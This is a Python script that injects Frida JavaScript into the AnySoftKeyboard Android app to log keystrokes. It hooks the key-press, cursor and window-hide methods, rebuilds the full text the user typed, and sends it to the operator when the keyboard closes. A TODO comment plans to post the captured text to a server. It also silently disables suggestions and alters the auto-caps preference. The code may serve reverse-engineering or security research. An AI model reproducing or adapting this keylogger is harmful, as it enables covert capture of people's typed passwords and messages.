import frida, sys

def on_message(message, data):
    #if message['type'] == 'send':
    #    print("[*] {0}".format(message['payload']))
    #else:
    if(message['type'] == 'send'): 
        if type(message['payload']) is dict and \
            "type" in message['payload'] and \
            message['payload']['type'] == 'userInput':
            print("The user entered the following string until closing the keyboard: ")
            print(message['payload']['input'])
            # TODO request to post data to serve
        else: 
            print("No userinput recorded")
    else: 
        print(message)
    #import requests
    #r = requests.get('https://cat-fact.herokuapp.com/facts/')
    #print(r.json())

jscode = """



let always_caps = false;
let user_pressed_caps = false;

function only_allow_caps_after_one_cap(i)
{
    if(!always_caps)
    {
        user_pressed_caps = i;
        if(user_pressed_caps)
        {
            always_caps = true;
        }
        return user_pressed_caps;
    }
    return always_caps;
}

function getVersion()
{
    const ActivityThread = Java.use('android.app.ActivityThread')
    const currentApplication = ActivityThread.currentApplication()
    const context = currentApplication.getApplicationContext()
    const pkgManager = context.getPackageManager()
    const pkgInfo = pkgManager.getPackageInfo(context.getPackageName(), 128)

    /* Don't work */
    // console.log('version: ', pkgInfo.versionName)
    // console.log('version: ', pkgInfo._versionName.value)

    console.log('version: ', pkgInfo.getClass().getField('versionName').get(pkgInfo))
    var PackageManager = Java.use("android.content.pm.PackageManager");
    var packageManager = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext().getPackageManager();
    var GET_PERMISSIONS = PackageManager.GET_PERMISSIONS.value;
    var packageInfo = packageManager.getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS.value);

    var permissions = packageInfo.requestedPermissions.value;
    console.log(permissions);

    for (var i = 0; i < permissions.length; i++) {
        var permission = permissions[i];
        console.log(permission);
    }
}

Java.perform(() => {
    let Integer = Java.use("java.lang.Integer");
    let castObj = Java.use("c.d.a.a.g");
    let SharedPref = Java.use("android.content.SharedPreferences");
    let cIC = undefined;
    let prefsChanged = ["auto_caps", "double_space_to_period", "settings_key_bool_should_swap_punctuation_and_space"];
    let userPrefs = {
        auto_caps: undefined, 
        double_space_to_period: undefined,
        settings_key_bool_should_swap_punctuation_and_space: undefined
    };
    let userInputs = [];
    let previousCursorPosition = undefined;

    let keycodes = {
        32: "space", 
        10: "enter", 
        9: "tab", 
        27: "escape",
        '-5': "delete",
        '-2': "MODE_SYMBOLS",
        '-99': "MODE_ALPHABET",
        '-42069': "CURSOR BIGGER THAN ARR", 
        '-42070': "EMOJI PAD",
    };

    const key_pad = {isCapped: false, key: " ", keycode: -42069, key_swapped: false, cursorPosition: undefined};
    const key_dot = {isCapped: false, key: ".", keycode: ".".charCodeAt(0), key_swapped: false, cursorPosition: undefined};
    const emoji_pad = {isCapped: false, key: "", keycode: -42070, key_swapped: false, cursorPosition: undefined};

    let preferenceKeys = {
        auto_caps: {
            pref: 2131821138, 
            default_value: 2131034122
        },
        double_space_to_period: {
            pref: 0x7f110262, 
            default_value: 0x7f050011,
        }, 
        settings_key_bool_should_swap_punctuation_and_space: {
            pref: 0x7f110256,
            default_value: 0x7f05000c
        }
    }

    const removeAt = (arr, idx) => {
        arr.splice(idx, 1);
    }
    const insertAt = (arr, idx, elem) => {
        arr.splice(idx, 0, elem);
    }


    let AnySoftKeyboardRxPrefs = Java.use("com.anysoftkeyboard.ime.AnySoftKeyboardRxPrefs");
    let AnySoftKeyboard = Java.use("com.anysoftkeyboard.AnySoftKeyboard");
    let n0 = Java.use("c.b.x.n0");

    n0["onSharedPreferenceChanged"].implementation = function (sharedPreferences, str) {
        // here a prefrence change can be detected
        prefsChanged.push(str);
        this["onSharedPreferenceChanged"](sharedPreferences, "auto_caps");
       
    };



    function getCurrentCursorPosition()
    {
        if(cIC !== undefined && cIC !== null)
        {
            let char_cnt = cIC.getTextBeforeCursor(Integer["MAX_VALUE"].value, 0);
            if(char_cnt === null)
                return -1;
            let len = char_cnt.length();
            for(let i = userInputs.length; i < len; i++)
            {
                userInputs.push(key_pad);
            }
            return len;
        }
    }


    function getPreferenceValue(classObj, prefId, prefDefaultValId)
    {
        let prefs = Java.cast(classObj, AnySoftKeyboardRxPrefs);
        let test = prefs.m.value.a(prefId,prefDefaultValId);
        test = Java.cast(test, castObj);    
        return test.b();
    }
    
    // get currentInputConnection
    let AnySoftKeyboardBase = Java.use("com.anysoftkeyboard.ime.AnySoftKeyboardBase");
    AnySoftKeyboardBase["onComputeInsets"].implementation = function (insets) {
        cIC = this.getCurrentInputConnection(); 
        this["onComputeInsets"](insets);
    };

    AnySoftKeyboardBase["hideWindow"].implementation = function () {
        let string = "";
        for(let i = 0; i < userInputs.length; ++i){
            let text = userInputs[i].key;
            let keycode = userInputs[i].keycode;
            if(keycode === -42069)
            {
                string += "[🤯&";
                continue;
            }
            if(keycode === -42070)
                continue;
            if(text === undefined || (keycode < 0 && keycodes[keycode] !== undefined))
                continue;
            
            if(userInputs[i].isCapped)
                text = text.toUpperCase();
            string += text;
        }
        //console.log(string);
        send({type: 'userInput', 'input': string});
        userInputs = [];
        previousCursorPosition = undefined;
        this["hideWindow"]();
    };

    AnySoftKeyboard["s"].implementation = function (i, pVar, i2, iArr, z) {
        cIC = this.getCurrentInputConnection();
        for(let i = 0; i < prefsChanged.length; ++i)
        {
            
            let curr_pref = preferenceKeys[prefsChanged[i]];
            if(curr_pref === undefined)
                continue;

            // once a preference change is detected, the actual values of the preferences can be read here
            let value = getPreferenceValue(this, curr_pref.pref, curr_pref.default_value);
            
            
            //console.log(prefsChanged[i] + " value updated from " + userPrefs[prefsChanged[i]] + " to " + value);
            
            
            userPrefs[prefsChanged[i]] = value;
        }
        prefsChanged = [];
        this["s"](i, pVar, i2, iArr, z);
    };

    let DetectorClass = Java.use("c.b.z.r0.n0");
    DetectorClass["c"].implementation = function(i){
        return this["c"](i);
    };

    function printUserInputs()
    {
        console.log("------------- USER INPUTS ARRAY START -----------------");
        for(let i = 0; i < userInputs.length; i++)
        {
            console.log(userInputs[i].key + " " + userInputs[i].keycode + " " + userInputs[i].cursorPosition);
        }
        console.log("------------- USER INPUTS ARRAY END -----------------");
    }


    let PointerTracker = Java.use("c.b.z.r0.x0");
    PointerTracker["a"].implementation = function (i, i1, i2, i3, i4) {
        let keyboard_key = this["b"](i); // is getKey Function
        let detector = this["_d"].value; // _d is mKeyDetector
        // detect if letter is capitalized
        let capitalizedLetter = detector.c(keyboard_key);
        let currentCursorPosition = getCurrentCursorPosition();
        let keycode = keyboard_key.e();
        if(keycodes[keycode] === "delete")
        {
            if(userInputs.length !== 0)
            {
                if(currentCursorPosition >= 1)
                    removeAt(userInputs, currentCursorPosition-1);
            }
        }
        let multiTapTime = this["o"].value;
        let b; 
        let test = keyboard_key.getClass().getDeclaredFields();
        for(let i = 0; i < test.length; ++i)
        {
            // iterating over members with type CharSequence 
            if(test[i].getType().getName() === "java.lang.CharSequence")
            {
                    let curr_charseq = test[i].get(keyboard_key);
                    if(curr_charseq !== null)
                    {
                        b = curr_charseq.toString();
                    }
            }
        }
        if(keycode > 0){
            let char = String.fromCharCode(keycode);
            let new_keypress = {isCapped: capitalizedLetter, key: char, keycode: keycode, key_swapped: false, cursorPosition: currentCursorPosition};
            let cursorPosition = currentCursorPosition;
            if(char === ".")
            {
                if(userInputs.length > 0 && 
                    currentCursorPosition >= 1 && 
                        keycodes[userInputs[currentCursorPosition-1].keycode] === "space")
                {
                    let tmp = userInputs[currentCursorPosition-1];
                    userInputs[currentCursorPosition-1] = new_keypress;
                    new_keypress = tmp;
                }
            }
            
            if(char === " ") 
            {
                if(multiTapTime != -1)
                {
                    if(userInputs.length > 0 && 
                        currentCursorPosition >= 1 && 
                        keycodes[userInputs[currentCursorPosition-1].keycode] === "space")
                    {
                        let dot = key_dot; 
                        dot.cursorPosition = currentCursorPosition-1;
                        userInputs[currentCursorPosition-1] = dot;
                    }
                }
            }
            //printUserInputs();
            insertAt(userInputs, currentCursorPosition, new_keypress);
        }
        else{
            let emoji = /\p{Extended_Pictographic}/u.test(b);
            if(emoji)
            {
                let emojiIdx = currentCursorPosition+b.length;
                let tmp_emoji_pad = emoji_pad; 
                tmp_emoji_pad.cursorPosition = emojiIdx;
                for(let i = 0; i < b.length-1; ++i)
                {
                                        
                    insertAt(userInputs, currentCursorPosition, emoji_pad);
                    currentCursorPosition += 1;
                }
            }
            let new_keypress = {isCapped: false, key: b, keycode: keycode, key_swapped: false, cursorPosition: currentCursorPosition};
            insertAt(userInputs, currentCursorPosition, new_keypress);

        }
        this["a"](i, i1, i2, i3, i4);
    };

    // disable suggestions (just output empty list)
    let CandidateView = Java.use("com.anysoftkeyboard.keyboards.views.CandidateView");
    CandidateView["e"].implementation = function (list, z, z2) {
        let newList = Java.use("java.util.ArrayList").$new(0);
        this["e"](newList, z, z2);
    };
});
"""

process = frida.get_usb_device().attach('AnySoftKeyboard')
script = process.create_script(jscode)
script.on('message', on_message)
script.load()
sys.stdin.read()